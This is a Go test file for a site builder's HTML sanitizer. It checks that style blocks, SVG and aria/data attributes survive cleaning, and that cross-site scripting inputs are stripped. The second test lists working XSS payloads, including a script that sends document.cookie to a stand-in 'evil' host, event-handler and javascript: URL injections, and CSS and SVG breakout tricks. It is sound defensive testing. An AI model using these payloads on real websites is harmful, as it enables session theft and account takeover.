package builder

import (
	"strings"
	"testing"
)

// TestSanitizeCustomBlockHTMLKeepsAuthoringSurface pins the regression that
// took every custom block's CSS off the published site: rawHTMLPolicy deletes
// <style>, SVG, aria-* and data-*, and a site authored out of custom blocks
// renders as unstyled text with nothing in the build log to say so.
func TestSanitizeCustomBlockHTMLKeepsAuthoringSurface(t *testing.T) {
	tests := []struct {
		name  string
		in    string
		wants []string
	}{
		{
			name:  "style element and its css survive",
			in:    `<style>.card{border-radius:0.5rem;width:11rem}</style><div class="card"></div>`,
			wants: []string{"<style>", ".card{border-radius:0.5rem;width:11rem}", `class="card"`},
		},
		{
			name:  "inline svg survives with geometry attributes",
			in:    `<svg viewBox="0 0 120 60" aria-hidden="true"><rect x="4" y="26" width="34" height="21" rx="4" fill="#95C93D" transform="rotate(-12 23 36)"></rect></svg>`,
			wants: []string{"<svg", `viewBox="0 0 120 60"`, "<rect", `fill="#95C93D"`, `transform="rotate(-12 23 36)"`},
		},
		{
			name:  "aria and data attributes survive",
			in:    `<a href="/miljo/" data-nav="miljo" aria-current="page" aria-label="Miljo">Miljo</a>`,
			wants: []string{`data-nav="miljo"`, `aria-current="page"`, `aria-label="Miljo"`},
		},
		{
			name:  "custom property style attribute survives",
			in:    `<g class="fly" style="--del:0.7s;--dur:6.2s"></g>`,
			wants: []string{`style="--del:0.7s;--dur:6.2s"`},
		},
		{
			name:  "img loading and dimensions survive",
			in:    `<img src="/media/a/320.webp" alt="Example" width="320" height="209" loading="lazy" decoding="async">`,
			wants: []string{`loading="lazy"`, `width="320"`, `height="209"`},
		},
		{
			name:  "multiple style blocks all survive in order",
			in:    `<style>.a{color:red}</style><p>x</p><style>.b{color:blue}</style>`,
			wants: []string{".a{color:red}", ".b{color:blue}"},
		},
		{
			name:  "style nested inside svg survives",
			in:    `<svg viewBox="0 0 10 10"><style>.t{fill:#008B99}</style><rect class="t"></rect></svg>`,
			wants: []string{"<svg", ".t{fill:#008B99}"},
		},
	}
	for _, tt := range tests {
		t.Run(tt.name, func(t *testing.T) {
			got := sanitizeCustomBlockHTML(tt.in)
			for _, want := range tt.wants {
				if !strings.Contains(got, want) {
					t.Errorf("lost %q from authoring surface\ngot: %s", want, got)
				}
			}
		})
	}
}

// TestSanitizeCustomBlockHTMLStillBlocksExecution asserts the hole the
// sanitizer was added to close stays closed. Every case is a real attack, and
// the assertion is that the executable part is gone, not that the input was
// rejected wholesale.
func TestSanitizeCustomBlockHTMLStillBlocksExecution(t *testing.T) {
	tests := []struct {
		name      string
		in        string
		forbidden []string
	}{
		{
			name:      "script element",
			in:        `<div>ok</div><script>fetch("//evil/"+document.cookie)</script>`,
			forbidden: []string{"<script", "document.cookie"},
		},
		{
			name:      "event handler attribute",
			in:        `<div onclick="alert(1)" onmouseover="alert(2)">x</div>`,
			forbidden: []string{"onclick", "onmouseover", "alert(1)"},
		},
		{
			name:      "javascript url",
			in:        `<a href="javascript:alert(1)">x</a>`,
			forbidden: []string{"javascript:"},
		},
		{
			name:      "iframe and object",
			in:        `<iframe src="//evil"></iframe><object data="//evil"></object>`,
			forbidden: []string{"<iframe", "<object"},
		},
		{
			name:      "style element closed early to smuggle a script",
			in:        `<style>.a{}</style><script>alert(1)</script></style>`,
			forbidden: []string{"<script", "alert(1)"},
		},
		{
			name:      "css breaking out of its own element",
			in:        `<style>.a{}</` + `style><img src=x onerror=alert(1)></style>`,
			forbidden: []string{"onerror"},
		},
		{
			name:      "css import fetches a remote sheet",
			in:        `<style>@import url("//evil/x.css");.a{color:red}</style>`,
			forbidden: []string{"@import"},
		},
		{
			name:      "legacy css expression and binding",
			in:        `<style>.a{width:expression(alert(1));-moz-binding:url(//evil)}</style>`,
			forbidden: []string{"expression(", "-moz-binding"},
		},
		{
			name:      "svg script child",
			in:        `<svg viewBox="0 0 10 10"><script>alert(1)</script><rect></rect></svg>`,
			forbidden: []string{"<script", "alert(1)"},
		},
		{
			name:      "svg use pulling an external document",
			in:        `<svg viewBox="0 0 10 10"><use href="https://evil/x.svg#a"></use></svg>`,
			forbidden: []string{"https://evil"},
		},
		{
			name:      "style attribute carrying a url scheme",
			in:        `<div style="background:url(javascript:alert(1))">x</div>`,
			forbidden: []string{"javascript:"},
		},
		{
			name:      "html comment reopening markup from inside css",
			in:        `<style>.a{}<!--</style><script>alert(1)</script>--></style>`,
			forbidden: []string{"<script", "alert(1)"},
		},
	}
	for _, tt := range tests {
		t.Run(tt.name, func(t *testing.T) {
			got := sanitizeCustomBlockHTML(tt.in)
			for _, bad := range tt.forbidden {
				if strings.Contains(got, bad) {
					t.Errorf("executable content survived: %q\ngot: %s", bad, got)
				}
			}
		})
	}
}

// TestRenderCustomBlockKeepsCSS is the end-to-end assertion at the render sink
// itself, so a future change that points renderCustomBlock back at
// rawHTMLPolicy fails here rather than on a client's published site.
func TestRenderCustomBlockKeepsCSS(t *testing.T) {
	out := renderCustomBlock(map[string]any{
		"name":   "kortstorlekar",
		"markup": `<style>.client-sizing__c--special{width:11rem}</style><div class="client-sizing__c client-sizing__c--special"></div>`,
	})
	for _, want := range []string{"<style>", ".client-sizing__c--special{width:11rem}", "client-sizing__c--special"} {
		if !strings.Contains(out, want) {
			t.Errorf("renderCustomBlock dropped %q\ngot: %s", want, out)
		}
	}
}
